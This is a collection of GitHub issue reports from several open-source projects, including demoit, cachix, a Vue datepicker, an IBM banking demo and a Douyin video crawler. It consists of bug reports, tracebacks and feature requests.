``` There are legit cases where we'd want a custom port for the web server (instead of 8888) and for the shell server (instead of 9999) ```
$ cd $HOME/go/src/github.com/dgageot/demoit
$ cd sample
$ demoit
```
-> works.

```
$ cd $HOME/go/src/github.com/dgageot/demoit
$ demoit sample
mandatory resource folder ".demoit": .demoit doesn't exist
```

-> fail :( Seems that since latest commit Next and Previous is not working.

OS: MacOS
Browser: Chrome
Output:
```Uncaught ReferenceError: next is not defined
    at HTMLAnchorElement.onclick ((index):26)
onclick @ (index):26``` Tried demoit; it didn't compile out of the box, but it was easy to fix (see below). Also, for the install instructions, you don't need both `go build` and `go install`, only the install is necessary. Other than this great stuff...  Thanks.

```
diff --git a/handlers/shell.go b/handlers/shell.go
index 33ed52a..f5a7f79 100644
--- a/handlers/shell.go
+++ b/handlers/shell.go
@@ -25,6 +25,7 @@ import (
        "strings"

        "github.com/dgageot/demoit/files"
+       "github.com/dgageot/demoit/flags"
        "github.com/gorilla/mux"
        "github.com/pkg/errors"
 )
```
 (Observed on Linux)

The right scrollbar is always visible, regardless the actual height of my browser window. It's still visible in Fullscreen.

![demoit_scrollbar](https://user-images.githubusercontent.com/13508141/54528353-0ed39e00-497d-11e9-91c9-3cb8cafec543.png)
 ```
$ demoit -port 7000 sample/
2019/03/18 14:15:27 Welcome to DemoIt. Please, open http://localhost:7000
2019/03/18 14:15:27 "Dev Mode" to live reload your slides can be enabled with '--dev'
2019/03/18 14:15:27 Permitting clients to write input to the PTY.
$
```

The server doesn't start, but doesn't say why.
I suspect it is because I have another demoit server running, using the default shell port 9999. (Observed on Linux)

The right scrollbar is always visible, regardless the actual height of my browser window. It's still visible in Fullscreen.

![demoit_scrollbar](https://user-images.githubusercontent.com/13508141/54528353-0ed39e00-497d-11e9-91c9-3cb8cafec543.png)
 This would be nice

![demoit_replay](https://user-images.githubusercontent.com/13508141/54524185-93202400-4971-11e9-8ebf-7a294d597f02.png)
 Thank you for this cool idea and project.
I decided to give it a try, but I seem to be hitting an error (see screenshot).

## Steps

1. `cd $HOME/go/src/github.com/dgageot/demoit`
1. `demoit sample` or `demoit -dev sample`
1. Visit http://localhost:9999 or http://127.0.0.1:9999

## Environment

- macOS 10.14.3
- chrome 71.0.3578.98
- safari 12.0.3

## Screenshot

<img width="952" alt="screen shot 2019-01-29 at 9 40 42 am" src="https://user-images.githubusercontent.com/6811830/51928138-0c57bd80-23aa-11e9-81bd-591b917d2e93.png">
 Seems that since latest commit Next and Previous is not working.

OS: MacOS
Browser: Chrome
Output:
```
Uncaught ReferenceError: next is not defined
    at HTMLAnchorElement.onclick ((index):26)
onclick @ (index):26
``` There are legit cases where we'd want a custom port for the web server (instead of 8888) and for the shell server (instead of 9999) These clutter the server output, if we can mute them it would be nice.

![Screenshot from 2019-07-30 23-03-35](https://user-images.githubusercontent.com/13508141/62137665-49811600-b321-11e9-97de-af7962f9d7b5.png)
 I built and tried running under WSL (Windows Subsystem for Linux / Ubuntu 18.04).
I can browse through the sample slides OK, served up by demoit, but I'm unable to get a terminal session to work (keep getting "Connection Closed").

I added a fmt.Println() to see what "commands" was set to when launching the shell.

Any idea how to get this working under WSL?
Is it a networking issue?
Any debug suggestions welcome ...

```
2019/02/11 16:44:51 Welcome to DemoIt. Please, open http://localhost:8888
2019/02/11 16:44:51 "Dev Mode" to live reload your slides can be enabled with '--dev'
2019/02/11 16:44:51 Permitting clients to write input to the PTY.
2019/02/11 16:44:51 HTTP server is listening at: http://:::9999/
Using shell /bin/bash
Using history /tmp/demoit388801105
commands =  cd ./folder;HISTFILE=/tmp/demoit388801105 exec /bin/bash
Ping http://localhost:8000/
2019/02/11 16:44:59 [::1]:30386 200 GET /
2019/02/11 16:44:59 [::1]:30391 200 GET /auth_token.js
2019/02/11 16:44:59 [::1]:30392 200 GET /config.js
2019/02/11 16:44:59 [::1]:30386 200 GET /css/index.css
2019/02/11 16:44:59 [::1]:30390 200 GET /css/xterm_customize.css
2019/02/11 16:44:59 [::1]:30389 200 GET /css/xterm.css
2019/02/11 16:44:59 [::1]:30393 200 GET /js/gotty-bundle.js
Ping http://localhost:8000/
2019/02/11 16:45:02 New client connected: [::1]:30407, connections: 1/0
2019/02/11 16:45:02 Connection closed by an error: failed to create backend: failed to start command `sh`: fork/exec /bin/sh: invalid argument: [::1]:30407, connections: 0/0
Ping http://localhost:8000/
Ping http://localhost:8000/
Ping http://localhost:8000/
Ping http://localhost:8000/
Ping http://localhost:8000/
Ping http://localhost:8000/
Ping http://localhost:8000/
Ping http://localhost:8000/
Ping http://localhost:8000/
Ping http://localhost:8000/
Ping http://localhost:8000/
Ping http://localhost:8000/
```

similarly if I connect to http://127.0.0.1:9999 I get
```
2019/02/11 16:52:20 Welcome to DemoIt. Please, open http://localhost:8888
2019/02/11 16:52:20 "Dev Mode" to live reload your slides can be enabled with '--dev'
2019/02/11 16:52:20 Permitting clients to write input to the PTY.
2019/02/11 16:52:20 HTTP server is listening at: http://:::9999/
2019/02/11 16:52:31 127.0.0.1:31135 200 GET /
2019/02/11 16:52:31 127.0.0.1:31137 200 GET /css/xterm_customize.css
2019/02/11 16:52:31 127.0.0.1:31140 200 GET /auth_token.js
2019/02/11 16:52:31 127.0.0.1:31136 200 GET /css/xterm.css
2019/02/11 16:52:31 127.0.0.1:31139 200 GET /config.js
2019/02/11 16:52:31 127.0.0.1:31135 200 GET /css/index.css
2019/02/11 16:52:32 127.0.0.1:31138 200 GET /js/gotty-bundle.js
2019/02/11 16:52:33 New client connected: 127.0.0.1:31143, connections: 1/0
2019/02/11 16:52:33 Connection closed by an error: failed to create backend: failed to start command `sh`: fork/exec /bin/sh: invalid argument: 127.0.0.1:31143, connections: 0/0
2019/02/11 16:52:35 127.0.0.1:31138 200 GET /favicon.png
``` I currently serve my iframe HTML files stored in folder `js`.

It would be nice to support an explicit folder `iframes`, and an idiomatic way way to store IMG/JS/CSS dependencies of the iframes. Hello,

Nice project, I really like the embedded shell :)
For the shell to be displayed properly you need to have the font "Inconsolata for Powerline" installed on your computer. Otherwise the cursor will not be placed properly and the shell display width will not be good.
It could be added to the readme to avoid other people spending time to understand why the cursor is misplaced, moreover the font can be found for free here: https://github.com/powerline/fonts/tree/master/Inconsolata
Just tell me if you are ok, I can add it to the readme.

Thanks ! If I have 22 slides, accessing `/23` panics.

Expected: 404 Hi, love this project, I'm evaluating it for future presentations. However, there seems to be a problem with the code preview pages in recent Firefox and Chromium versions:

Firefox 67.0b16:
![image](https://user-images.githubusercontent.com/6604151/57233310-4a522680-7016-11e9-9cc6-0f1cbfe2ce4a.png)

Chromium 74.0.3729.131 (Official Build) Arch Linux (64-bit):
![image](https://user-images.githubusercontent.com/6604151/57233374-6a81e580-7016-11e9-84c3-4d1d2e2ede13.png)



 
<---------->
122870796
@profpatsch When I added an auth token and generated a keypair, it suddenly worked. Is the silence on error intended?

https://github.com/haskell-fswatch/hfsnotify/issues/91  - cachix should detect NixOS and adapt the snippet
 - bad escaping

```
$ cachix use hercules-ci

MustBeRoot "Run command as root OR execute: $ echo \"trusted-users = root $USER\" | sudo tee -a /etc/nix/nix.conf && sudo pkill nix-daemon"
$ echo "trusted-users = root $USER" | sudo tee -a /etc/nix/nix.conf && sudo pkill nix-daemon
[sudo] password for user: 
tee: /etc/nix/nix.conf: Read-only file system
trusted-users = root user

``` Although current HTTP API is served at https://cachix.org/api/v1/ - it's not finalized. In following months I'd like to gather feedback and document in-depth how cachix works and how to integrate it into different services (Hydra, other CIs, etc).

- [ ] remove `c` prefix in `NarInfoCreate` types
- [ ] tests all `ToJSON/FromJSON` outputs
- [ ] use tags http://hackage.haskell.org/package/servant-swagger-1.1.5/docs/Servant-Swagger.html#g:3 It seems that I managed to upload a broken `nar` to the cache with cachix (version 0.3.4): https://tenpureto.cachix.org/wrjd3z9x1gix6bxy0m9p4djzjypkrpxh.narinfo
Unlike some previous issues (#147), the file is not empty, just the [content](https://tenpureto.cachix.org/nar/bd11361f7dc8c701ddae2ea82853d63c07ad949051724f8d1fad30f8195c97a8.nar.xz) looks truncated, at least from the beginning.
The command line I used was
```
cachix push tenpureto -w &
nix-build --no-link -A ... | cachix push tenpureto
```
and it could have been also forcibly terminated it a couple of times. It runs on the CI, so I, unfortunately, have no chance to look at the nix store.

Will rebuilding and re-pushing to the cache work (I will re-build anyway, but it takes some time without the cache)? If not, can you please delete the broken archive?
If you want to investigate how it could happen, I will also be happy to help. This makes the UX a bit better of when a developer is trying to understand what's going on. When trying to build or push to cachix:

```
nix-build -A free-category --argstr compiler ghc865
warning: unable to download 'https://free-algebras.cachix.org/57z9xp2vcbcf9f8ifhb4wkb188pzgrwm.
narinfo': HTTP error 504; retrying in 277 ms
```
or when I try to push:
```
cachix push free-algebras ./result 

FailureResponse (Response {responseStatusCode = Status {statusCode = 504, statusMessage = "Gate
way Time-out"}, responseHeaders = fromList [("Date","Fri, 06 Sep 2019 19:24:39 GMT"),("Content-
Type","text/html; charset=UTF-8"),("Connection","keep-alive"),("Cache-Control","no-store, no-cache, m
ust-revalidate, post-check=0, pre-check=0"),("Pragma","no-cache"),("Server","cloudflare"),], responseHttpVersion = HTTP/1.1, responseBody = ""})
```  I am playing around with using `cachix push --watch` on travis, and it is very convenient. But it seems I tend to lose caching of the final artifact, because travis kills the `cachix push` process before it is done uploading.

It would be nice if there was a `cachix push --unwatch` command that would tell the watching daemon to finish uploading and terminate, and this command would return only when the daemon is done.  **Describe the bug**

When I run: `cachix use miso-haskell` I get an error.

**To Reproduce**
Steps to reproduce the behavior:
1. Run `cachix use miso-haskell`
2. Outputs: `MustBeRoot "Run command as root OR execute: $ echo \"trusted-users = root $USER\" | sudo tee -a /etc/nix/nix.conf && sudo pkill nix-daemon"`

**Expected behavior**

I expect it to work...

**Desktop (please complete the following information):**
 - OS: NixOS 19.03

**Additional context**

```shell
neo@nixos:~/Sources]$ cachix use miso-haskell

MustBeRoot "Run command as root OR execute: $ echo \"trusted-users = root $USER\" | sudo tee -a /etc/nix/nix.conf && sudo pkill nix-daemon"
[neo@nixos:~/Sources]$ sudo cachix use miso-haskell
[sudo] password for neo: 

Could not install NixOS configuration to /etc/nixos/ due to lack of write permissions.

Pass `--nixos-folder /etc/mynixos/` as an alternative location with write permissions.
[neo@nixos:~/Sources]$ echo \"trusted-users = root $USER\" | sudo tee -a /etc/nix/nix.conf && sudo pkill nix-daemon"
> help
> WAT
> ?
>
```
 just wanted to say thank you. this project is great. i've used it personally for a while and at my workplace for a few months now. my workplace doesnt want to embrace NixOS/hydra, so cachix has been incredibly useful. i'm currently trying to convince them to go for a private cache. i was able to setup cachix ci in only a few minutes using cachix-action. anyway this is just a thank you, i'm going to close it immediately. ```
$ /nix/store/l5ihwni9i78ahq45iwjg8vpqclwcwc3l-cachix-0.2.1-bin/bin/cachix push --help
Usage: cachix push [--compression-level [0..9]] NAME ([PATHS...] |
                   [-w|--watch-store])
  Upload Nix store paths to the binary cache

Available options:
  -h,--help                Show this help text
  --compression-level [0..9]
                           The compression level for XZ compression. Take
                           compressor *and* decompressor memory usage into
                           account before using [7..9]! (default: 2)
  -w,--watch-store         Run in daemon mode and push store paths as they are
                           added to /nix/store
``` [This link](https://camo.githubusercontent.com/bf1baa25154a041bc4a6865fe91ca327b4173eb0/68747470733a2f2f6361636869782e6f72672f696d616765732f6c6f676f2e706e67) in the README seems to be resolving to "Not Found" I'm finding that a previously-working build [is timing out](https://travis-ci.com/purcell/nix-emacs-ci/jobs/238335888) in `cachix push` today, while the same operation works from my MacOS development machine just fine. Any guesses at a possible cause? **Describe the bug**

When I run: `cachix use miso-haskell` I get an error.

**To Reproduce**
Steps to reproduce the behavior:
1. Run `cachix use miso-haskell`
2. Outputs: `MustBeRoot "Run command as root OR execute: $ echo \"trusted-users = root $USER\" | sudo tee -a /etc/nix/nix.conf && sudo pkill nix-daemon"`

**Expected behavior**

I expect it to work...

**Desktop (please complete the following information):**
 - OS: NixOS 19.03

**Additional context**

```shell
neo@nixos:~/Sources]$ cachix use miso-haskell

MustBeRoot "Run command as root OR execute: $ echo \"trusted-users = root $USER\" | sudo tee -a /etc/nix/nix.conf && sudo pkill nix-daemon"
[neo@nixos:~/Sources]$ sudo cachix use miso-haskell
[sudo] password for neo: 

Could not install NixOS configuration to /etc/nixos/ due to lack of write permissions.

Pass `--nixos-folder /etc/mynixos/` as an alternative location with write permissions.
[neo@nixos:~/Sources]$ echo \"trusted-users = root $USER\" | sudo tee -a /etc/nix/nix.conf && sudo pkill nix-daemon"
> help
> WAT
> ?
>
```
 I'm not sure if this is possible, or it may be that I need to change how I invoke nix-build... but I do builds on ephemeral workers. Rebuilding my entire system and having a failure at the end currently results in all of the hard work being tossed.

Is there a way to have a nix-build that emits many store paths and have them uploaded, even if the build fails 90% of the way through?

`nix-build --keep-going | cachix push --continuous` or something that will start uploading as soon as nix-build emits paths and keep going even if nix-build fails?

(As I'm typing this, I'm assuming my usage of `-o pipefail` in my scripts affects this as well...) Currently cachix prints out something along the lines of

```
pushing /nix/store/2jsms9xbr9ryn5x3f51743h3hzqj5gjp-pkg-name-1
pushing /nix/store/3axfyzm3zpk9v2zq7i3fc8vnqglrhawh-pkg-name-2
pushing /nix/store/3j212krlhzhyvi66m93n5mllc59y1j8m-pkg-name-3
```

It would be great if it also printed out the size of each of the things being pushed.

Context: we are investigating a spurious issue where our jenkins jobs timeout when pushing outputs. It would help somewhat to see how large the push is, exactly. I wanted to play around with [`static-haskell-nix`](https://github.com/nh2/static-haskell-nix), and the [instructions](https://github.com/nh2/static-haskell-nix#binary-caches-for-faster-building-optional) there recommend using cachix.

The instructions on `static-haskell-nix` don't explain how to install cachix, but just link to the cachix [homepage](https://cachix.org/).

The cachix homepage doesn't explain how to install cachix.  I tried clicking `Get Started ->`, but it is asking me to sign in to do OAuth with Github.  It is unclear whether I need to do this just to install `cachix` and use someone else's cache.

So I tried to install cachix on my machine, and run `cachix use static-haskell-nix` as recommended by the `static-haskell-nix` instructions:

```console
$ nix-env -iA nixos.cachix
...
$ cachix use static-haskell-nix

/etc/nixos/cachix: createDirectory: permission denied (Permission denied)
```

I can see that is is not able to create `/etc/nixos/cachix`.  At this point, I'm not sure why this is, but my guess is that it is trying to store some sort of configuration there.

I then thought to try nixpkgs `master` and install the latest version of `cachix`.  Maybe it would work.  However, it appears that the latest version of `cachix` (0.2.1) is marked broken in nixpkgs `master`.

So I thought maybe I need to run `cachix` with `sudo`.  This appears to work.

-------------------------------------------------------------------------------------------------------

I guess my solutions about how to fix this would be the following:

- Add a section to the `cachix` homepage explaining how to install `cachix`.  Ideally this would be directly on the homepage, and you wouldn't have to login first.
- Make the error from `cachix use` a little easier to understand.  It should suggest re-running with `sudo`, and a short explanation of what it is trying to do.


Ping @nh2, since this has to do with `static-haskell-nix`. `cachix-0.2.1` seems to include unnecessary dependencies in the closure, e.g. `ghc-8.6.5`, which leads to it slowing down my CI builds, e.g. https://travis-ci.org/vaibhavsagar/presentations/builds/557692395. https://github.com/zimbatm/mdsh
<---------->
122874170
Will there be support for `Date-Fns` Version **2**? 
Or maybe make this a configurable option?

 Currently none of the examples on [this examples page](http://htmlpreview.github.io/?https://github.com/MikaelEdebro/vue-airbnb-style-datepicker/blob/master/docs/examples.html) work

The error in the console is 

Uncaught ReferenceError: Vue is not defined
    at <anonymous>:3:5
    at loadJS (htmlpreview.js:85)
    at htmlpreview.js:56 Will there be support for `Date-Fns` Version **2**? 
Or maybe make this a configurable option?

 Hi. How i can prevent rechoose date-one if i set it by props?

![image](https://user-images.githubusercontent.com/29097652/57851604-0a4b2a80-77f2-11e9-90c6-dfee25064ddd.png)

![1](https://user-images.githubusercontent.com/29097652/57851572-f69fc400-77f1-11e9-906e-3ba9a498bd01.gif)
 Hello!  I need to be able to update the 'Apply' text found in `data.texts.apply`.  Could we move this object out of `data` and into `props`, with the current values set as the default?
I'd be happy to submit a PR for this if you are interested.

Thanks! Issue:
No way to control whether the previous or next buttons should show. Can only change what icon to display.

Suggestion:
I would like to make some changes in the code and work to get a pull request where this functionality can exist. I'm not sure how Airbnb handles this but found an example on https://www.expedia.com/ where the calendar does not allow you to go back into the past or go further than a max month. Maybe a maxMonth and minMonth property to help control this?

Let me know if I can work on this or if I should look into some other options.

Thanks! Hi,
I love this date picker! It looks so slick. I was wondering if it is possible to select multiple date ranges? It would be nice to allow a user the ability to enter a range of dates they are available. The component is showing incorrectly.
<img width="596" alt="bug" src="https://user-images.githubusercontent.com/44032019/47946640-183bfc80-deed-11e8-82e0-8b43d6519e58.png">
 Can we add custom dates groups and style those groups differently?
Currently we have **enabled-dates**, **disabled-dates** groups. What if we can add a new group let's say **booked-dates** and maybe just by adding a class **asd__day--booked** to those dates will do the trick as we can easily then add custom style for those classes. Upgrading to Vue 2.6 seems to break the trigger boolean functionality. It might be related to their changes to $nextTick: https://github.com/vuejs/vue/issues/9478

One possible solution could be to change usage of `$nextTick()` to `setTimeout()` This error breaks here: `setTimeout(function(){n[0].focus()},10)`
At the `setFocusedDate` function, I think.

This occurs when I try to leave a page with the picker. Can we have `monthsToShow` option with respect to screen size? At least for tablet and desktop as we have default value 1 for mobile. 

For example:
  `monthsToShow-desktop`: 1
  `monthsToShow-tablet`: 2

**Why we need this:**
Very common in design that we increase space (e.g bootstrap columns for small screens). I've faced the same problem showing datepicker in `col-lg-3 col-md-12`, now tablet has enough space (12 columns) to display 2 months but not for 3 columns for desktop. Documentation for @date-one-selected should meant to say "when _first_ day selected", not "when _second_ day selected."

![Screen Shot 2019-06-07 at 3 22 04 PM](https://user-images.githubusercontent.com/19922047/59136744-52fd8b80-8939-11e9-929f-11925b1137d9.png) When I tried the examples the date picker was not laggy on mobile phones, I created a new vue project using vue cli and used the same code https://mikaeledebro.gitbooks.io/vue-airbnb-style-datepicker/INSTALLATION.html , the date picker was very laggy on mobiles especially IOS  Can we add custom dates groups and style those groups differently?
Currently we have **enabled-dates**, **disabled-dates** groups. What if we can add a new group let's say **booked-dates** and maybe just by adding a class **asd__day--booked** to those dates will do the trick as we can easily then add custom style for those classes.  Hi, 
When I open the datepicker, everything works as it should be.
But when I click previousMonth 2 times, component shows incorrectly. => it happens when the initial DateOne or the empty new Date (to set focusedDate) is on the last "asd_month", the hidden one. 

Step 1 - shown correctly:
![bildschirmfoto 2018-12-17 um 14 51 41](https://user-images.githubusercontent.com/45843652/50091761-8114d500-020c-11e9-94fb-1e339ba7b58c.png)

Step 2 - after first click on previousMonth:
![bildschirmfoto 2018-12-17 um 14 51 51](https://user-images.githubusercontent.com/45843652/50091717-680c2400-020c-11e9-850d-bca7e1ae4b57.png)

Step 3 - after second click on previousMonth:
(the whole asd_month with selected DateOne should be the last asd_month (hidden))
![bildschirmfoto 2018-12-17 um 14 51 32](https://user-images.githubusercontent.com/45843652/50091785-94c03b80-020c-11e9-89c4-b82bf9645d77.png)

After that I also get following Error in the Dev Tools console from Chrome:
![bildschirmfoto 2018-12-17 um 15 03 30](https://user-images.githubusercontent.com/45843652/50091946-0dbf9300-020d-11e9-8354-41e7c37641b4.png)

![bildschirmfoto 2018-12-17 um 15 05 02](https://user-images.githubusercontent.com/45843652/50091987-26c84400-020d-11e9-9c64-0307f42a72e6.png)

It can be reproduced on ur Demo site: first DatePicker
http://htmlpreview.github.io/?https://github.com/MikaelEdebro/vue-airbnb-style-datepicker/blob/master/docs/examples.html

_Originally posted by @mzotter in https://github.com/MikaelEdebro/vue-airbnb-style-datepicker/issues/65#issuecomment-447858033_

I look forward to hearing from you. Upgrading to vue 2.6 seems to break the trigger boolean functionality. It might be related to their changes to $nextTick: 
https://github.com/vuejs/vue/issues/9478

one possible soultion might be to change calls to `$nextTick()` to `setTimeout()` How can I change calendar style as I see all color styles are inline. You may want to disable the datepicker while the page is loading.   Having the ability to pass a prop `disabled` to disable the input box would be helpful.
<---------->
123277371
Now Watson Assistant works with api key instead of username and password Lots of instances of "Bluemix" should be replaced with IBM Cloud

Same with the `bx` command, it should be replaced with the new `ibmcloud` CLI. the link to your video is a protected link https://ibm.ent.box.com/s/fgpqiacn9ewaorgp8l97bnrk760s8rx3 The [pipeline.yaml](https://github.com/IBM/innovate-digital-bank/blob/master/.bluemix/pipeline.yml) file is woefully out of date. It contains several instances of the `bx` command which was the old Bluemix CLI tool. It needs to be migrated to [`ibmcloud`](https://console.bluemix.net/docs/cli/reference/ibmcloud/bx_cli.html#ibmcloud_cli)

 The [pipeline.yaml](https://github.com/IBM/innovate-digital-bank/blob/master/.bluemix/pipeline.yml) file is woefully out of date. It contains several instances of the `bx` command which was the old Bluemix CLI tool. It needs to be migrated to [`ibmcloud`](https://console.bluemix.net/docs/cli/reference/ibmcloud/bx_cli.html#ibmcloud_cli)

 Lots of instances of "Bluemix" should be replaced with IBM Cloud

Same with the `bx` command, it should be replaced with the new `ibmcloud` CLI. From the Article for Local launch a lot of things is unclear.
For example about DB
---
Get your mongo connection string. Almost all your microservices need it; keep it safe!
---
Ok, I save it in .env:
MONGO_URL=mongodb://$USERNAME:$PASSWORD@e07eca23-91af-413b-8bf6-3e3f9825717c-0.497129fd685f442ca4df759dd55ec01b.databases
BASE_PATH=e07eca23-91af-413b-8bf6-3e3f9825717c-0.497129fd685f442ca4df759dd55ec01b.databases.appdomain.cloud
When I do "npm start" on /accounts/ folder, I got a lot of missing components and I setup all of them, but the error still threw.
---
Running on e07eca23-91af-413b-8bf6-3e3f9825717c-0.497129fd685f442ca4df759dd55ec01b.databases.appdomain.cloud:3400, connecting to mongodb://$USERNAME:$PASSWORD@e07eca23-91af-413b-8bf6-3e3f9825717c-0.497129fd685f442ca4df759dd55ec01b.databases.appdomain.cloud:31892,e07eca23-91af-413b-8bf6-3e3f9825717c-1.497129fd685f442ca4df759dd55ec01b.databases.appdomain.cloud:31892/ibmclouddb?authSource=admin&replicaSet=replset
(node:20293) UnhandledPromiseRejectionWarning: TypeError: Cannot read property 'onOpen' of undefined
    at /home/pavlo/prj/innovate-digital-bank/accounts/server.js:12:16
    at promise.then.err (/home/pavlo/prj/innovate-digital-bank/accounts/node_modules/mongoose/lib/connection.js:394:53)
    at <anonymous>
    at runMicrotasksCallback (internal/process/next_tick.js:121:5)
    at _combinedTickCallback (internal/process/next_tick.js:131:7)
    at process._tickCallback (internal/process/next_tick.js:180:9)
    at Function.Module.runMain (module.js:695:11)
    at startup (bootstrap_node.js:188:16)
    at bootstrap_node.js:609:3

What I'm doing wrong and how to resolve it?
Thank you! https://www.npmjs.com/package/connect-mongo#re-use-a-mongoose-connection

Re-using the mongoose connection:
```
app.use(session({
    store: new MongoStore({ mongooseConnection: mongoose.connection })
}));
``` We applied mongodb from hyper-protect-dbaas service, and verified that we are able to login db via terminal, looks like the db works pretty well. I modified .env config file and replaced parameters with correct mongodb string, then deployed digital bank app on k8s cluster, but pod can not be up and running.

innovate-accounts-deployment-5cd49d786c-ff9gf   0/1     Pending            0          4m12s
innovate-portal-deployment-696557dfb7-jnmk2     0/1     Pending            0          5m49s Right now, microservices is using mongoose@`5.0.0-rc1`. Latest and stable version right now is `5.5.2`. I suggest using this one instead of a release candidate version [Travis are now recommending removing the __sudo__ tag](https://blog.travis-ci.com/2018-11-19-required-linux-infrastructure-migration).

"_If you currently specify __sudo: false__ in your __.travis.yml__, we recommend removing that configuration_" 
<---------->
123725639
 There are a bunch of files referencing `asyncy` images e.g. `asyncy/http`.

We should move all images to the `storyscript` repository on dockerhub.

https://hub.docker.com/u/asyncy
https://hub.docker.com/u/storyscript  Globally remove `asyncy` and replace with `storyscript`. - only engine (namespace Asyncy-system) can talk to other namespaces
- namespaces can't talk to each other
- within a namespace, everybody can talk to everybody  
<---------->
124162527
```python
$ python amemv-video-ripper.py "http://v.douyin.com/NsuCGu/"
/bin/sh: 1: node: not found
Traceback (most recent call last):
  File "amemv-video-ripper.py", line 491, in <module>
    CrawlerScheduler(content)
  File "amemv-video-ripper.py", line 139, in __init__
    self.scheduling()
  File "amemv-video-ripper.py", line 159, in scheduling
    for url in self.numbers: self.download_user_videos(url)
  File "amemv-video-ripper.py", line 169, in download_user_videos
    video_count = self._download_user_media(user_id, dytk, url)
  File "amemv-video-ripper.py", line 294, in _download_user_media
    signature = self.generateSignature(str(user_id))
  File "amemv-video-ripper.py", line 144, in generateSignature
    return p.readlines()[0]
IndexError: list index out of range
``` MIT License 授予的权利与 README 中的表述冲突

> 大家好，这个项目是一个练手项目，源码仅作为和大家一起学习Python使用，你可以免费: 拷贝、分发和派生当前源码。你不可以用于商业目的及其他恶意用途。

建议移除 License 或者修改 README 描述  ios使用抖音 提取出来的是http://v.douyin.com/FEe9Ao/
而android提取的是http://www.iesdouyin.com/share/user/74767852886?u_code=19d2l4j24/?share_type=link&from=singlemessage
 ios成功，而android失败。
将from=singlemessage删除后 ，依然失败。 i'm trying to crawl the https://www.tiktok.com/en/trending page from tik tok. what id do i need to supply to the .js to make it genereate the _signature?`

best regards tiktok现在不能下载了吗？下载了源码跑不起来。
报错：
window.collectEvent('404_referral', {})

window.collectEvent('send');</script>
Traceback (most recent call last):
  File "amemv-video-ripper.py", line 543, in <module>
    CrawlerScheduler(content)
  File "amemv-video-ripper.py", line 150, in __init__
    self.scheduling()
  File "amemv-video-ripper.py", line 164, in scheduling
    self.download_user_videos(url)
  File "amemv-video-ripper.py", line 179, in download_user_videos
    video_count = self._download_user_media(user_id, dytk, url)
  File "amemv-video-ripper.py", line 340, in _download_user_media
    res = self.requestWebApi(url, params)
  File "amemv-video-ripper.py", line 477, in requestWebApi
    return json.loads(content)
  File "C:\Program Files\Python37\lib\json\__init__.py", line 348, in loads
    return _default_decoder.decode(s)
  File "C:\Program Files\Python37\lib\json\decoder.py", line 337, in decode
    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
  File "C:\Program Files\Python37\lib\json\decoder.py", line 355, in raw_decode
    raise JSONDecodeError("Expecting value", s, err.value) from None
json.decoder.JSONDecodeError: Expecting value: line 1 column 2 (char 1) There's no video in number 60737323389.

Aweme number 60737323389, video number 0 昨天我在找批量下载抖音视频的程序，发现有人售卖源码，我买过来后发现是来自github的项目，并且他在卖之前还骗我说有java版的，结果最后只能给python版的。从他给我的记录来看，他卖了很久了，没一套100元。如果作者需要了解详情，请联系我。 There's no video in number 60737323389.

Aweme number 60737323389, video number 0 D:\Program Files\amemv-crawler>python amemv-video-ripper.py
Traceback (most recent call last):
  File "amemv-video-ripper.py", line 12, in <module>
    from six.moves import queue as Queue
ModuleNotFoundError: No module named 'six' 代码是不是没有用了？？我这边把你代码运行就错了，加密的地方好像获取不到什么数据 昨天我在找批量下载抖音视频的程序，发现有人售卖源码，我买过来后发现是来自github的项目，并且他在卖之前还骗我说有java版的，结果最后只能给python版的。从他给我的记录来看，他卖了很久了，没一套100元。如果作者需要了解详情，请联系我。  requests.exceptions.SSLError: HTTPSConnectionPool(host='www.iesdouyin.com', port=443): Max retries exceeded with url: /aweme/v1/aweme/post/?user_id=58865791120&count=21&max_cursor=0&aid=1128&_signature=CBt1qAAAVCX35IpX7YtURwgbdb%0A&dytk=9b9e00904fcc3c36aca3dc267ca86a42 (Caused by SSLError(SSLError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:777)'),)) I tried crawling https://www.tiktok.com/en/trending Am having problems with the signature.
i used "5" (which is the type parameter) as the value for user_id in self .generateSignature( str (user_id)) i also used the same ua for both request and encryption.

The _signature generated is always wrong!!. please help requests.exceptions.SSLError: HTTPSConnectionPool(host='www.iesdouyin.com', port=443): Max retries exceeded with url: /aweme/v1/aweme/post/?user_id=58865791120&count=21&max_cursor=0&aid=1128&_signature=CBt1qAAAVCX35IpX7YtURwgbdb%0A&dytk=9b9e00904fcc3c36aca3dc267ca86a42 (Caused by SSLError(SSLError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:777)'),)) Hi guys,

I just want to download the single video.
Example URL: `http://vt.tiktok.com/JaUxFm/`

Thank you in advance. 在浏览器拿到单个视频的地址 也就是Location那个url,然后照代码里面拼上其他参数，始终下载不了，能否帮忙解决一下 目前参考了[已关闭的issue68](https://github.com/loadchange/amemv-crawler/issues/68)，更新了node，也执行了`node fuck-byted-acrawler.js xxx` 得到了有正确返回，但再执行最新的`amemv-video-ripper.py`还是不停地retry...但愿能抽空帮忙看看，谢谢啦

>download user media: 70250XXXXXX, result retry: 31.
{"status_code": 0, "has_more": true, "aweme_list": []}


Traceback (most recent call last):
  File "amemv-video-ripper.py", line 543, in <module>
    CrawlerScheduler(content)
  File "amemv-video-ripper.py", line 150, in __init__
    self.scheduling()
  File "amemv-video-ripper.py", line 164, in scheduling
    self.download_user_videos(url)
  File "amemv-video-ripper.py", line 179, in download_user_videos
    video_count = self._download_user_media(user_id, dytk, url)
  File "amemv-video-ripper.py", line 354, in _download_user_media
    params['_signature'] = self.generateSignature(str(user_id))
  File "amemv-video-ripper.py", line 154, in generateSignature
    p = os.popen('node fuck-byted-acrawler.js %s' % value)
  File "C:\Users\Administrator\AppData\Local\Programs\Python\Python37\lib\os.py", line 989, in popen
    bufsize=buffering)
  File "C:\Users\Administrator\AppData\Local\Programs\Python\Python37\lib\subprocess.py", line 756, in __init__
    restore_signals, start_new_session)
  File "C:\Users\Administrator\AppData\Local\Programs\Python\Python37\lib\subprocess.py", line 1155, in _execute_child
    startupinfo)
KeyboardInterrupt 使用现在的签名算法，返回403
<---------->
124574483
 Is this project authorized?

If we use this open source code for simple development, such as Bluetooth version or other, to make a basic mechanical cat, can we manufacture and sell it? Hello,
 I have been reading your code and I saw that you remap de pins of the servos depending the walking mode. Could you explain in detail the idea behind the remaping process?

 You could see this remaping in the OpenCat.h file

